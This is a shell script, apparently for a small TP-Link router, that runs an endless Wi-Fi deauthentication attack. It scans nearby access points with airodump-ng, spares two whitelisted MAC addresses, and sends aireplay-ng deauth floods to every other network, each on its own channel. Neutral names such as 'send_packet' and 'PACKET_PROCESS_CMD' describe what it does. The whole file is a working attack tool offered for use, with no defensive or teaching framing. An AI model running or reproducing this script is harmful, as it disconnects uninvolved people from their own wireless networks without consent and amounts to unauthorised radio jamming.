#!/bin/sh

# Global parameters
MONITOR_INTERFACE="mon0"
DEFAULT_INTERFACE="wlan0"
DURATION=30  # Duration to run airodump-ng in seconds
WHITELIST="DC:D8:7C:05:21:49 FC:10:C6:93:EC:59"
PACKET_PROCESS_CMD="aireplay-ng --deauth 20 -D --ignore-negative-one -x 20 -a"
LED_PATH="/sys/devices/platform/leds-gpio/leds/tp-link:blue:system"
AIRODUMP_BLINK_RATE=1000  # Blink rate in milliseconds for airodump
PACKETPROCESS_BLINK_RATE=250  # Blink rate in milliseconds for packetprocess

# Log function
log() {
  local level="$1"
  local message="$2"
  local timestamp
  timestamp=$(date +"[%m/%d %H:%M:%S]")

  case "$level" in
    error)
      echo -e "\033[31m${timestamp} $message\033[0m"
      ;;
    warning)
      echo -e "\033[33m${timestamp} $message\033[0m"
      ;;
    *)
      echo -e "${timestamp} $message"
      ;;
  esac
}

# Enable monitor interface
enable_monitor_interface() {
  if ! ip link show "$MONITOR_INTERFACE" > /dev/null 2>&1; then
    log "info" "Enabling $MONITOR_INTERFACE using airmon-ng..."
    
    # If the monitor interface does not exist, enable it using airmon-ng
    airmon-ng start "$DEFAULT_INTERFACE" > /dev/null 2>&1
    
    # Check again if the monitor interface exists after enabling
    if ip link show "$MONITOR_INTERFACE" > /dev/null 2>&1; then
      log "info" "$MONITOR_INTERFACE interface was successfully enabled."
    else
      log "error" "Failed to enable $MONITOR_INTERFACE interface."
      exit 1
    fi
  else
    log "warning" "$MONITOR_INTERFACE interface already exists."
  fi
}

# Set interface to stable state
set_interface_stable() {
  iwconfig "$MONITOR_INTERFACE" rate 1M
  iwconfig "$MONITOR_INTERFACE" txpower fixed
  log "info" "$MONITOR_INTERFACE is now set to the most stable state for receiving and sending packets."
}

# Run airodump-ng
run_airodump() {
  log "info" "Running airodump-ng on $MONITOR_INTERFACE for $DURATION seconds..."
  echo "timer" > "$LED_PATH/trigger"
  echo "$AIRODUMP_BLINK_RATE" > "$LED_PATH/delay_off"
  echo "$AIRODUMP_BLINK_RATE" > "$LED_PATH/delay_on"
  airodump-ng --output-format csv --write /tmp/airodump_output "$MONITOR_INTERFACE" > /dev/null 2>&1 &
  AIRODUMP_PID=$!
  sleep "$DURATION"
  kill "$AIRODUMP_PID"
  echo "default-on" > "$LED_PATH/trigger"
}

# Collect data from airodump-ng output
collect_data() {
  log "info" "Collecting data from airodump-ng output..."
  awk -F, -v whitelist="$WHITELIST" '
  BEGIN {
    OFS = ",";
    split(whitelist, wl, " ");
    for (i in wl) {
      whitelist_map[wl[i]] = 1;
    }
  }
  NR > 2 && $1 != "" && $1 !~ /Station/ && $11 > 0 && !($1 in whitelist_map) {
    print $1, $11, $4, $14
  }
  ' /tmp/airodump_output-01.csv | sort -t, -k2,2nr > /tmp/airodump_parsed.csv

  if [ -s /tmp/airodump_parsed.csv ]; then
    log "info" "Collected data:"
    cat /tmp/airodump_parsed.csv
  else
    log "warning" "Nothing found."
  fi

  # Clean up temporary files
  rm /tmp/airodump_output-*.csv
}

# Send packet function
send_packet() {
  while IFS=, read -r BSSID PWR CHAN ESSID; do
    log "info" "Setting $MONITOR_INTERFACE to channel $CHAN for BSSID $BSSID..."
    iwconfig "$MONITOR_INTERFACE" channel "$CHAN"
    log "info" "Sending packet to BSSID $BSSID..."
    echo "timer" > "$LED_PATH/trigger"
    echo "$PACKETPROCESS_BLINK_RATE" > "$LED_PATH/delay_off"
    echo "$PACKETPROCESS_BLINK_RATE" > "$LED_PATH/delay_on"
    $PACKET_PROCESS_CMD "$BSSID" "$MONITOR_INTERFACE" > /dev/null 2>&1 &
    PACKET_PROCESS_PID=$!

    # Wait for packetprocess to finish
    wait $PACKET_PROCESS_PID
    echo "default-on" > "$LED_PATH/trigger"
  done < /tmp/airodump_parsed.csv
}

# Main script execution
enable_monitor_interface
set_interface_stable

# Loop to run the process endlessly
while true; do
  run_airodump
  collect_data
  send_packet
  sleep 3  # Add a delay to reduce CPU usage
done